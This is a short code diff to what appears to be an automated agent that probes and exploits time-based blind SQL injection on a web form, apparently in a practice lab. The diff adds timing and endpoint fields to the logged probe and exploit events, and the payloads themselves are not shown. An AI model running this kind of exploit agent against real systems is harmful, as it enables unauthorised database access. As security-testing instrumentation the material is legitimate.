@@ -69,7 +69,18 @@ def _probe_preconditions(
             start = time.monotonic()
             resp = session.get(MODULE_PATH, params={"id": payload, "Submit": "Submit"})
             elapsed = time.monotonic() - start
-            events.append(probe_event(AGENT_ID, payload, resp.status_code, True))
+            baseline_ms = baseline_elapsed * 1000
+            elapsed_ms = elapsed * 1000
+            events.append(probe_event(
+                AGENT_ID,
+                payload,
+                resp.status_code,
+                True,
+                endpoint=MODULE_PATH,
+                elapsed_ms=elapsed_ms,
+                baseline_elapsed_ms=baseline_ms,
+                delay_ms=elapsed_ms - baseline_ms,
+            ))
             # Check if response time significantly exceeds baseline
             if elapsed - baseline_elapsed > TIME_THRESHOLD:
                 observations[_PROBE_OBSERVATION_KEY] = True
@@ -106,7 +117,18 @@ def _attempt_exploit(
             start = time.monotonic()
             resp = session.get(MODULE_PATH, params={"id": payload, "Submit": "Submit"})
             elapsed = time.monotonic() - start
-            events.append(exploit_event(AGENT_ID, payload, resp.status_code, True))
+            baseline_ms = baseline_elapsed * 1000
+            elapsed_ms = elapsed * 1000
+            events.append(exploit_event(
+                AGENT_ID,
+                payload,
+                resp.status_code,
+                True,
+                endpoint=MODULE_PATH,
+                elapsed_ms=elapsed_ms,
+                baseline_elapsed_ms=baseline_ms,
+                delay_ms=elapsed_ms - baseline_ms,
+            ))
             # Full exploit: requires at least 2 distinct delay confirmations
             # to confirm meaningful extraction, not just a single delay.
             if elapsed - baseline_elapsed > TIME_THRESHOLD:
